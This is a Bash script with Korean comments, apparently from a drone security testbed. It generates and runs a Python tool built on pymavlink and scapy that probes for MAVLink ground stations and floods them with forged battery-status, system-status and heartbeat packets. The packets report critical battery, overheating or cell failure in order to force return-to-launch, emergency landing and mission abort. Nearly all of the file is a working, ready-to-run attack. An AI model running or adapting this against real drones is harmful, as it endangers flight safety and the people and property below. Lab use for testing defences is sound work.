#!/bin/bash

# =============================================================================
# DVD Protocol Tampering Module: Battery Status Spoofing Attack
# =============================================================================
# 파일: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/battery_spoofing.sh
# 목적: 배터리 상태 스푸핑을 통한 긴급 착륙 유도 공격
# 작성자: MTD Testbed Team
# =============================================================================

# 공통 모듈 로드
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="Battery Status Spoofing Attack"
ATTACK_TYPE="PROTOCOL_TAMPERING"
TARGET_IP="10.13.0.6"
TARGET_PORT="14550"
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/battery_spoofing_$(date +%Y%m%d_%H%M%S).log"
IOC_FILE="/tmp/battery_spoofing_iocs.txt"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/battery_spoofing_report_$(date +%Y%m%d_%H%M%S).json"
PYTHON_SCRIPT="/tmp/battery_spoofing_attack.py"

# 배터리 스푸핑 시나리오
declare -A BATTERY_SCENARIOS=(
    ["CRITICAL_LOW"]="remaining=0,voltage=3000,emergency=true"
    ["SUDDEN_DRAIN"]="remaining=5,voltage=3200,emergency=true" 
    ["VOLTAGE_DROP"]="remaining=20,voltage=2800,emergency=true"
    ["OVERHEATING"]="remaining=30,voltage=3400,temperature=80"
    ["CELL_FAILURE"]="remaining=15,voltage=3100,cells_failed=2"
    ["RAPID_DISCHARGE"]="remaining=2,voltage=3050,discharge_rate=high"
)

# 헤더 출력
print_header() {
    clear
    echo -e "${BOLD}${RED}"
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║                     🔋 DVD Battery Spoofing Attack 🔋                   ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${BLUE}Target: Battery Management System${NC}"
    echo -e "${BLUE}Method: False Battery Status Injection${NC}"
    echo -e "${BLUE}Impact: Emergency Landing Procedures${NC}"
    echo ""
}

# 배터리 스푸핑 Python 스크립트 생성
create_battery_spoofing_script() {
    echo -e "${CYAN}[*] Creating battery spoofing Python script...${NC}" | tee -a "$LOG_FILE"
    
    cat > "$PYTHON_SCRIPT" << 'EOF'
#!/usr/bin/env python3
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random
import signal

class BatterySpoofingAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = int(target_port)
        self.running = True
        self.packets_sent = 0
        self.current_scenario = "CRITICAL_LOW"
        
        # 배터리 상태 시나리오
        self.scenarios = {
            'CRITICAL_LOW': {
                'remaining': 0,
                'voltage': [3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0],
                'temperature': 400,  # 40도 (0.1도 단위)
                'current': -5000,    # -50A 방전
                'consumed': 5000,    # 5000mAh 소모
                'energy_consumed': 10000
            },
            'SUDDEN_DRAIN': {
                'remaining': 5,
                'voltage': [3200, 3200, 3200, 0, 0, 0, 0, 0, 0, 0],
                'temperature': 450,
                'current': -8000,    # 급속 방전
                'consumed': 4800,
                'energy_consumed': 9500
            },
            'VOLTAGE_DROP': {
                'remaining': 20,
                'voltage': [2800, 2800, 2800, 0, 0, 0, 0, 0, 0, 0],  # 위험 전압
                'temperature': 350,
                'current': -3000,
                'consumed': 4000,
                'energy_consumed': 8000
            },
            'OVERHEATING': {
                'remaining': 30,
                'voltage': [3400, 3400, 3400, 0, 0, 0, 0, 0, 0, 0],
                'temperature': 800,  # 80도 (과열)
                'current': -4000,
                'consumed': 3500,
                'energy_consumed': 7000
            },
            'CELL_FAILURE': {
                'remaining': 15,
                'voltage': [3100, 0, 3100, 0, 0, 0, 0, 0, 0, 0],  # 셀 2개 실패
                'temperature': 400,
                'current': -6000,
                'consumed': 4250,
                'energy_consumed': 8500
            }
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\n[!] Attack interrupted. Sent {self.packets_sent} spoofed battery packets.")
        self.running = False
        sys.exit(0)
    
    def create_battery_status(self, scenario='CRITICAL_LOW'):
        """가짜 배터리 상태 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        scenario_data = self.scenarios.get(scenario, self.scenarios['CRITICAL_LOW'])
        
        return mav.battery_status_encode(
            id=0,  # 배터리 ID
            battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
            type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
            temperature=scenario_data['temperature'],
            voltages=scenario_data['voltage'],
            current_battery=scenario_data['current'],
            current_consumed=scenario_data['consumed'],
            energy_consumed=scenario_data['energy_consumed'],
            battery_remaining=scenario_data['remaining']
        ).pack(mav)
    
    def create_heartbeat(self):
        """하트비트 메시지 생성"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        ).pack(mav)
    
    def create_sys_status(self, battery_remaining=0):
        """시스템 상태 메시지 생성 (배터리 정보 포함)"""
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1
        
        return mav.sys_status_encode(
            onboard_control_sensors_present=0,
            onboard_control_sensors_enabled=0,
            onboard_control_sensors_health=0,
            load=500,  # 50% CPU 사용률
            voltage_battery=3000 if battery_remaining == 0 else 3400,  # mV
            current_battery=-5000 if battery_remaining == 0 else -1000,  # cA
            battery_remaining=battery_remaining,  # %
            drop_rate_comm=0,
            errors_comm=0,
            errors_count1=0,
            errors_count2=0,
            errors_count3=0,
            errors_count4=0
        ).pack(mav)
    
    def send_mavlink_packet(self, packet_data):
        """MAVLink 패킷 전송"""
        try:
            packet = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=packet_data)
            send(packet, verbose=False)
            self.packets_sent += 1
            return True
        except Exception as e:
            print(f"[!] Packet send failed: {e}")
            return False
    
    def execute_scenario_attack(self, scenario, duration=30):
        """특정 시나리오로 배터리 스푸핑 공격"""
        print(f"[+] Executing {scenario} battery spoofing scenario for {duration} seconds")
        
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration and self.running:
            # 배터리 상태 메시지 전송
            if self.send_mavlink_packet(self.create_battery_status(scenario)):
                pass
            
            # 시스템 상태 메시지 전송
            scenario_data = self.scenarios[scenario]
            if self.send_mavlink_packet(self.create_sys_status(scenario_data['remaining'])):
                pass
            
            # 하트비트 전송
            if packet_count % 5 == 0:  # 5번에 한 번씩
                if self.send_mavlink_packet(self.create_heartbeat()):
                    pass
            
            packet_count += 1
            
            if packet_count % 10 == 0:
                elapsed = int(time.time() - start_time)
                print(f"[*] {scenario}: {self.packets_sent} packets sent ({elapsed}/{duration}s)")
            
            time.sleep(0.5)  # 0.5초마다 전송
        
        print(f"[+] {scenario} scenario completed")
    
    def execute_progressive_drain_attack(self, duration=60):
        """점진적 배터리 드레인 공격"""
        print(f"[+] Executing progressive battery drain attack for {duration} seconds")
        
        start_time = time.time()
        initial_battery = 100
        
        while time.time() - start_time < duration and self.running:
            elapsed = time.time() - start_time
            # 시간에 따라 배터리가 급격히 감소
            current_battery = max(0, int(initial_battery - (elapsed / duration) * 100 * 3))  # 3배 빠른 감소
            
            # 커스텀 배터리 상태 생성
            voltage = max(2800, 3400 - int(elapsed * 10))  # 전압도 함께 감소
            
            custom_scenario = {
                'remaining': current_battery,
                'voltage': [voltage, voltage, voltage, 0, 0, 0, 0, 0, 0, 0],
                'temperature': min(800, 300 + int(elapsed * 5)),  # 온도 상승
                'current': -int(2000 + elapsed * 100),  # 방전량 증가
                'consumed': int(1000 + elapsed * 80),
                'energy_consumed': int(2000 + elapsed * 160)
            }
            
            # 임시 시나리오 저장
            self.scenarios['PROGRESSIVE_DRAIN'] = custom_scenario
            
            if self.send_mavlink_packet(self.create_battery_status('PROGRESSIVE_DRAIN')):
                pass
            
            if self.send_mavlink_packet(self.create_sys_status(current_battery)):
                pass
            
            print(f"[*] Progressive drain: {current_battery}% battery, {voltage}mV ({int(elapsed)}s)")
            time.sleep(2)
        
        print("[+] Progressive drain attack completed")
    
    def execute_full_attack(self):
        """전체 배터리 스푸핑 공격 실행"""
        print(f"[+] Starting comprehensive battery spoofing attack on {self.target_ip}:{self.target_port}")
        
        # 1. 점진적 드레인 공격
        self.execute_progressive_drain_attack(30)
        
        # 2. 각 위험 시나리오 실행
        scenarios = ['CRITICAL_LOW', 'SUDDEN_DRAIN', 'VOLTAGE_DROP', 'OVERHEATING', 'CELL_FAILURE']
        
        for scenario in scenarios:
            if not self.running:
                break
            self.execute_scenario_attack(scenario, 20)
            time.sleep(5)  # 시나리오 간 대기
        
        print(f"[+] Battery spoofing attack completed. Total packets sent: {self.packets_sent}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 battery_spoofing_attack.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    
    attack = BatterySpoofingAttack(target_ip, target_port)
    attack.execute_full_attack()
EOF
    
    chmod +x "$PYTHON_SCRIPT"
    echo -e "${GREEN}[✓] Battery spoofing script created: ${PYTHON_SCRIPT}${NC}" | tee -a "$LOG_FILE"
    echo "BATTERY_SCRIPT:CREATED_${PYTHON_SCRIPT}" >> "$IOC_FILE"
}

# 타겟 탐지
detect_targets() {
    echo -e "${YELLOW}[+] Detecting available MAVLink targets...${NC}" | tee -a "$LOG_FILE"
    
    local targets=(
        "10.13.0.6:14550"    # QGroundControl (Bridge)
        "192.168.13.14:14550" # MAVProxy (WiFi)
        "10.13.0.4:14550"    # MAVProxy (Bridge)
        "127.0.0.1:14550"    # Local SITL
    )
    
    for target in "${targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            echo -e "${GREEN}[✓] Found MAVLink service: ${target}${NC}" | tee -a "$LOG_FILE"
            TARGET_IP="$ip"
            TARGET_PORT="$port"
            echo "BATTERY_TARGET:DISCOVERED_${target}" >> "$IOC_FILE"
            return 0
        fi
    done
    
    echo -e "${YELLOW}[!] No live targets found, using default${NC}" | tee -a "$LOG_FILE"
    echo "BATTERY_TARGET:DEFAULT_MODE" >> "$IOC_FILE"
    return 1
}

# 의존성 설치
install_dependencies() {
    echo -e "${YELLOW}[+] Installing required dependencies...${NC}" | tee -a "$LOG_FILE"
    
    # 패키지 업데이트
    apt-get update -qq
    apt-get install -y python3 python3-pip 2>&1 | tee -a "$LOG_FILE"
    
    # Python 라이브러리 설치
    pip3 install pymavlink scapy 2>&1 | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Dependencies installed successfully${NC}" | tee -a "$LOG_FILE"
        echo "BATTERY_DEPS:INSTALLED" >> "$IOC_FILE"
        return 0
    else
        echo -e "${RED}[!] Failed to install dependencies${NC}" | tee -a "$LOG_FILE"
        return 1
    fi
}

# 배터리 스푸핑 공격 실행
execute_battery_spoofing() {
    echo -e "${BOLD}${RED}🔋 Executing Battery Status Spoofing Attack...${NC}"
    echo ""
    
    local total_duration=120  # 2분 공격
    local start_time=$(date +%s)
    
    echo -e "${CYAN}[*] Starting battery status spoofing...${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Target: ${TARGET_IP}:${TARGET_PORT}${NC}" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Duration: ${total_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    # Python 스크립트를 백그라운드에서 실행
    timeout "$total_duration" python3 "$PYTHON_SCRIPT" "$TARGET_IP" "$TARGET_PORT" &
    local attack_pid=$!
    
    echo "BATTERY_ATTACK:STARTED_PID_${attack_pid}_$(date +%s)" >> "$IOC_FILE"
    
    # 진행률 표시
    local step=0
    while kill -0 $attack_pid 2>/dev/null && [ $step -lt $total_duration ]; do
        step=$((step + 5))
        local progress=$((step * 100 / total_duration))
        
        printf "\r${RED}Battery Spoofing: [%-20s] %d%% (%d/${total_duration}s)${NC}" \
               "$(printf "%*s" $((progress / 5)) | tr ' ' '█')" "$progress" "$step"
        
        # 중간 IOC 생성
        if [ $((step % 20)) -eq 0 ]; then
            echo "BATTERY_SPOOF:STATUS_MANIPULATED_$(date +%s)" >> "$IOC_FILE"
        fi
        
        sleep 5
    done
    echo ""
    
    # 공격 프로세스 정리
    if kill -0 $attack_pid 2>/dev/null; then
        kill -TERM $attack_pid 2>/dev/null
        sleep 2
        kill -KILL $attack_pid 2>/dev/null
    fi
    
    local end_time=$(date +%s)
    local actual_duration=$((end_time - start_time))
    
    echo -e "${GREEN}[✓] Battery spoofing attack completed${NC}" | tee -a "$LOG_FILE"
    echo -e "${BLUE}[*] Attack duration: ${actual_duration} seconds${NC}" | tee -a "$LOG_FILE"
    
    echo "BATTERY_ATTACK:COMPLETED_DURATION_${actual_duration}s" >> "$IOC_FILE"
}

# 시나리오별 공격 실행
execute_scenario_attacks() {
    echo -e "${CYAN}[*] Executing individual battery spoofing scenarios...${NC}" | tee -a "$LOG_FILE"
    
    local scenario_count=0
    
    for scenario in "${!BATTERY_SCENARIOS[@]}"; do
        echo -e "${YELLOW}[*] Executing scenario: ${scenario}${NC}" | tee -a "$LOG_FILE"
        
        # 시나리오 정보 파싱
        local scenario_info=${BATTERY_SCENARIOS[$scenario]}
        local remaining=$(echo "$scenario_info" | sed 's/.*remaining=\([^,]*\).*/\1/')
        local voltage=$(echo "$scenario_info" | sed 's/.*voltage=\([^,]*\).*/\1/')
        
        echo -e "${BLUE}[*] Spoofing: ${remaining}% battery, ${voltage}mV${NC}" | tee -a "$LOG_FILE"
        
        # 시나리오별 스크립트 생성 (간단한 버전)
        cat > "/tmp/battery_scenario_${scenario}.py" << EOF
#!/usr/bin/env python3
from pymavlink import mavutil
from scapy.all import *
import time
import sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

mav = mavutil.mavlink.MAVLink(None)
mav.srcSystem = 1
mav.srcComponent = 1

# ${scenario} 시나리오 실행
for i in range(20):
    battery_msg = mav.battery_status_encode(
        id=0,
        battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,
        type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,
        temperature=400,
        voltages=[${voltage}, ${voltage}, ${voltage}, 0, 0, 0, 0, 0, 0, 0],
        current_battery=-5000,
        current_consumed=5000,
        energy_consumed=10000,
        battery_remaining=${remaining}
    ).pack(mav)
    
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=battery_msg)
    send(packet, verbose=False)
    
    if i % 5 == 0:
        print(f"[*] ${scenario}: Sent {i+1}/20 packets")
    
    time.sleep(0.5)

print(f"[+] ${scenario} scenario completed")
EOF
        
        # 시나리오 실행
        timeout 15 python3 "/tmp/battery_scenario_${scenario}.py" "$TARGET_IP" "$TARGET_PORT" &
        local scenario_pid=$!
        
        # 진행률 표시
        for ((j=1; j<=15; j++)); do
            printf "\r${RED}${scenario}: [%-15s] %d/15s${NC}" \
                   "$(printf "%*s" "$j" | tr ' ' '█')" "$j"
            sleep 1
        done
        echo ""
        
        # 프로세스 정리
        kill -TERM $scenario_pid 2>/dev/null
        rm -f "/tmp/battery_scenario_${scenario}.py"
        
        scenario_count=$((scenario_count + 1))
        echo "BATTERY_SCENARIO:${scenario}_EXECUTED_$(date +%s)" >> "$IOC_FILE"
        
        sleep 3  # 시나리오 간 대기
    done
    
    echo -e "${GREEN}[✓] All battery scenarios completed: ${scenario_count} scenarios${NC}" | tee -a "$LOG_FILE"
    echo "BATTERY_SCENARIOS:COMPLETED_${scenario_count}_TOTAL" >> "$IOC_FILE"
}

# 공격 효과 모니터링
monitor_attack_effectiveness() {
    echo -e "${CYAN}[*] Monitoring battery spoofing effectiveness...${NC}" | tee -a "$LOG_FILE"
    
    # 스푸핑된 패킷 수 계산
    local spoofed_packets=$(grep -c "BATTERY_SPOOF" "$IOC_FILE" 2>/dev/null || echo "0")
    local scenarios_executed=$(grep -c "BATTERY_SCENARIO" "$IOC_FILE" 2>/dev/null || echo "0")
    
    echo -e "${GREEN}[✓] Battery Spoofing Impact Assessment:${NC}" | tee -a "$LOG_FILE"
    echo "    Spoofed Battery Messages: ${spoofed_packets}" | tee -a "$LOG_FILE"
    echo "    Attack Scenarios Executed: ${scenarios_executed}" | tee -a "$LOG_FILE"
    echo "    Battery Status Reliability: COMPROMISED" | tee -a "$LOG_FILE"
    echo "    Emergency Landing Risk: HIGH" | tee -a "$LOG_FILE"
    echo "    Flight Safety Impact: CRITICAL" | tee -a "$LOG_FILE"
    
    # IOCs 업데이트
    echo "BATTERY_IMPACT:SPOOFED_${spoofed_packets}_MESSAGES" >> "$IOC_FILE"
    echo "BATTERY_IMPACT:SAFETY_COMPROMISED" >> "$IOC_FILE"
    echo "BATTERY_IMPACT:EMERGENCY_LANDING_RISK" >> "$IOC_FILE"
}

# JSON 리포트 생성
generate_json_report() {
    local start_time=$1
    local end_time=$2
    
    cat > "$JSON_OUTPUT" << EOF
{
    "attack_info": {
        "name": "$ATTACK_NAME",
        "type": "$ATTACK_TYPE",
        "timestamp": "$(date -Iseconds)",
        "duration": $((end_time - start_time)),
        "status": "completed"
    },
    "target_details": {
        "target_ip": "$TARGET_IP",
        "target_port": "$TARGET_PORT",
        "protocol": "MAVLink over UDP",
        "attack_method": "Battery Status Message Spoofing"
    },
    "spoofing_parameters": {
        "battery_scenarios": [
            "Critical Low (0%)",
            "Sudden Drain (5%)",
            "Voltage Drop (2.8V)",
            "Overheating (80°C)",
            "Cell Failure",
            "Progressive Drain"
        ],
        "attack_vectors": [
            "BATTERY_STATUS message injection",
            "SYS_STATUS manipulation",
            "Progressive battery drain simulation"
        ],
        "tools_used": ["pymavlink", "scapy", "python3"]
    },
    "impact_assessment": {
        "battery_monitoring": "COMPROMISED",
        "flight_safety": "CRITICAL_RISK",
        "emergency_protocols": "LIKELY_TRIGGERED",
        "mission_continuity": "SEVERELY_IMPACTED",
        "detection_probability": "LOW"
    },
    "iocs_generated": $(wc -l < "$IOC_FILE"),
    "log_file": "$LOG_FILE",
    "ioc_file": "$IOC_FILE"
}
EOF
    
    echo -e "${GREEN}[✓] JSON report generated: ${JSON_OUTPUT}${NC}"
}

# 메인 실행 함수
main() {
    print_header
    
    # Root 권한 체크
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This attack requires root privileges${NC}"
        echo -e "${YELLOW}[*] Please run: sudo $0${NC}"
        exit 1
    fi
    
    # 로그 초기화
    echo "=== DVD Battery Spoofing Attack Started at $(date) ===" > "$LOG_FILE"
    echo "" > "$IOC_FILE"
    
    local start_time=$(date +%s)
    
    echo -e "${BOLD}${BLUE}🔋 Starting Battery Status Spoofing Attack...${NC}"
    echo ""
    
    # 1. 의존성 설치
    if ! install_dependencies; then
        echo -e "${RED}[!] Failed to install dependencies${NC}"
        exit 1
    fi
    
    # 2. 타겟 탐지
    detect_targets
    
    # 3. 배터리 스푸핑 스크립트 생성
    create_battery_spoofing_script
    
    # 4. 기본 배터리 스푸핑 공격
    execute_battery_spoofing
    
    # 5. 시나리오별 공격
    echo ""
    echo -e "${BOLD}${YELLOW}🔋 Scenario-based Battery Attacks...${NC}"
    execute_scenario_attacks
    
    # 6. 공격 효과 모니터링
    monitor_attack_effectiveness
    
    local end_time=$(date +%s)
    
    echo ""
    echo -e "${BOLD}${GREEN}🔋 Battery Spoofing Attack Completed!${NC}"
    echo ""
    echo -e "${GREEN}📊 Attack Summary:${NC}"
    echo "   • Duration: $((end_time - start_time)) seconds"
    echo "   • Target: ${TARGET_IP}:${TARGET_PORT}"
    echo "   • Attack Method: MAVLink Battery Status Spoofing"
    echo "   • Scenarios Executed: ${#BATTERY_SCENARIOS[@]}"
    echo "   • IOCs Generated: $(wc -l < "$IOC_FILE")"
    echo ""
    echo -e "${BLUE}📁 Output Files:${NC}"
    echo "   • Log: ${LOG_FILE}"
    echo "   • IOCs: ${IOC_FILE}"
    echo "   • JSON Report: ${JSON_OUTPUT}"
    echo "   • Attack Script: ${PYTHON_SCRIPT}"
    
    # JSON 리포트 생성
    generate_json_report "$start_time" "$end_time"
    
    echo ""
    echo -e "${YELLOW}💡 Expected Effects:${NC}"
    echo "   1. Ground Control Station shows 0% battery"
    echo "   2. Low battery warnings and alarms triggered"
    echo "   3. Automatic Return-to-Launch (RTL) activation"
    echo "   4. Emergency landing procedures initiated"
    echo "   5. Mission abort due to critical battery status"
    echo ""
    
    # IOCs 요약
    echo -e "${BOLD}${CYAN}🔍 Generated IOCs Summary:${NC}"
    cat "$IOC_FILE" | sort | uniq -c | head -10
    echo ""
    
    # 정리
    rm -f "$PYTHON_SCRIPT"
    rm -f /tmp/battery_scenario_*.py
}

# cleanup 함수
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up battery spoofing attack...${NC}"
    
    # Python 프로세스 정리
    pkill -f "battery_spoofing_attack.py" 2>/dev/null
    pkill -f "battery_scenario_" 2>/dev/null
    
    # 임시 파일 정리
    rm -f "$PYTHON_SCRIPT"
    rm -f /tmp/battery_scenario_*.py
    
    echo -e "${GREEN}[✓] Battery spoofing cleanup complete${NC}"
    exit 0
}

# SIGINT 시그널 처리
trap cleanup SIGINT SIGTERM

# 스크립트 실행
main "$@"